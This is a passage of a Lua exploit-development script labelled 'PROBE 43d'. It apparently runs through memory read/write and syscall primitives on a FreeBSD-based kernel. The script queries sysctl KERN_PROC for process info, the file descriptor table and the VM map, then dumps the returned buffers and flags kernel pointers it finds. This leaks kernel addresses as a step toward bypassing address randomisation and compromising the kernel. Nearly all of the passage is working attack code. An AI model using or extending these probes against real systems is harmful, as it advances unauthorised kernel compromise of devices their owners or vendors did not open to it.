--------------------------------------------------------------------
print("")
print("=== A: FULL KINFO_PROC (every qword) ===")
do
    local mib = memory.alloc(16)
    safe_wd(mib, 1)       -- CTL_KERN
    safe_wd(mib + 4, 14)  -- KERN_PROC
    safe_wd(mib + 8, 1)   -- KERN_PROC_PID
    safe_wd(mib + 12, pid)

    local outbuf = memory.alloc(0x800)
    for off = 0, 0x7FC, 4 do safe_wd(outbuf + off, 0) end
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, 0x800)

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local actual_len = safe_rd(oldlenp) or 0
    print("ret=" .. rv .. " len=" .. actual_len)

    if rv == 0 and actual_len > 0 then
        -- Dump EVERY qword
        local kptrs = {}
        for off = 0, actual_len - 8, 8 do
            local q = safe_rq(outbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                local tag = ""
                if h >= 0xFFFF8000 then
                    tag = " *** KPTR ***"
                    kptrs[#kptrs + 1] = {off = off, h = h, l = l}
                elseif h == 0xFFFFFFFF and l == 0 then
                    tag = " (bitmask)"
                elseif h == 0xFFFFFFFF and l == 0xFFFFFFFF then
                    tag = " (-1)"
                end
                -- Print non-zero qwords
                if h ~= 0 or l ~= 0 then
                    print(string.format("  +%03X: %08X_%08X%s", off, h, l, tag))
                end
            end
        end

        -- Also dump as raw bytes for string fields
        print("")
        print("  string fields:")
        -- ki_comm at ~+0x1B0 (process name, 20 bytes)
        -- ki_login at ~+0x1E0 (login name, 18 bytes)
        -- ki_emul at ~+0x370 (emulator name)
        local function dump_str(label, start, maxlen)
            local s = ""
            for i = 0, maxlen - 1 do
                local b = safe_rb(outbuf + start + i)
                if b and b > 31 and b < 127 then
                    s = s .. string.char(b)
                elseif b and b == 0 then
                    break
                else
                    s = s .. "."
                end
            end
            if #s > 0 then
                print(string.format("    %s (+%03X): \"%s\"", label, start, s))
            end
        end

        -- FreeBSD r230171 kinfo_proc layout (approximate):
        -- These offsets vary by version, dump a wide range
        for start = 0x100, 0x400, 0x10 do
            local has_ascii = false
            for i = 0, 15 do
                local b = safe_rb(outbuf + start + i)
                if b and b > 31 and b < 127 then
                    has_ascii = true
                    break
                end
            end
            if has_ascii then
                dump_str("str", start, 32)
            end
        end

        print("")
        print("=== KERNEL POINTER SUMMARY ===")
        print("found: " .. #kptrs)
        for _, kp in ipairs(kptrs) do
            print(string.format("  +%03X: %08X_%08X", kp.off, kp.h, kp.l))
        end
    end
end

--------------------------------------------------------------------
-- B) kern.proc.filedesc — file descriptor table dump
-- MIB: {1, 14, 14, pid} where 14 = KERN_PROC_FILEDESC
--------------------------------------------------------------------
print("")
print("=== B: KERN.PROC.FILEDESC ===")
do
    local mib = memory.alloc(16)
    safe_wd(mib, 1)       -- CTL_KERN
    safe_wd(mib + 4, 14)  -- KERN_PROC
    safe_wd(mib + 8, 14)  -- KERN_PROC_FILEDESC
    safe_wd(mib + 12, pid)

    -- Try size query first (oldp=NULL)
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, 0)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(0),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local needed = safe_rd(oldlenp) or 0
    print("  size query: ret=" .. rv .. " needed=" .. needed)

    if needed > 0 and needed < 0x40000 then
        local outbuf = memory.alloc(needed + 0x1000)
        for off = 0, math.min(needed + 0xFFC, 0x3FFFC), 4 do
            safe_wd(outbuf + off, 0)
        end
        safe_wd(oldlenp, needed + 0x1000)

        local ok2, ret2 = pcall(function()
            return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
                uint64(oldlenp), uint64(0), uint64(0))
        end)
        local rv2 = ok2 and to_num(ret2) or -999
        local actual = safe_rd(oldlenp) or 0
        print("  data query: ret=" .. rv2 .. " len=" .. actual)

        if rv2 == 0 and actual > 0 then
            -- Scan for kernel pointers
            local kptrs = {}
            for off = 0, actual - 8, 8 do
                local q = safe_rq(outbuf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        kptrs[#kptrs + 1] = {off = off, h = h, l = l}
                        print(string.format("  +%04X: %08X_%08X KPTR!", off, h, l))
                    end
                end
            end
            print("  kernel pointers: " .. #kptrs)
        end
    elseif rv == -999 then
        print("  syscall failed entirely")
    else
        print("  blocked or empty")
    end
end

--------------------------------------------------------------------
-- C) kern.proc.vmmap — try with LARGE buffer (128KB)
-- MIB: {1, 14, 35, pid} where 35 = KERN_PROC_VMMAP
--------------------------------------------------------------------
print("")
print("=== C: KERN.PROC.VMMAP (large buffer) ===")
do
    local mib = memory.alloc(16)
    safe_wd(mib, 1)       -- CTL_KERN
    safe_wd(mib + 4, 14)  -- KERN_PROC
    safe_wd(mib + 8, 35)  -- KERN_PROC_VMMAP
    safe_wd(mib + 12, pid)

    -- Size query first
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, 0)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(0),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local needed = safe_rd(oldlenp) or 0
    print("  size query: ret=" .. rv .. " needed=" .. needed)

    -- Even if size query fails, try with a big buffer
    local try_sizes = {0x10000, 0x20000, 0x40000}
    for _, sz in ipairs(try_sizes) do
        local outbuf = memory.alloc(sz)
        safe_wd(oldlenp, sz)
        local ok2, ret2 = pcall(function()
            return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
                uint64(oldlenp), uint64(0), uint64(0))
        end)
        local rv2 = ok2 and to_num(ret2) or -999
        local actual = safe_rd(oldlenp) or 0
        print(string.format("  buf=%dK: ret=%d len=%d", sz/1024, rv2, actual))

        if rv2 == 0 and actual > 0 then
            -- Scan for kernel ptrs
            for off = 0, math.min(actual - 8, sz - 8), 8 do
                local q = safe_rq(outbuf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print(string.format("    +%04X: %08X_%08X KPTR", off, h, l))
                    end
                end
            end
            break
        end
    end
end

print("")
print("=== PROBE 43d COMPLETE ===")
```
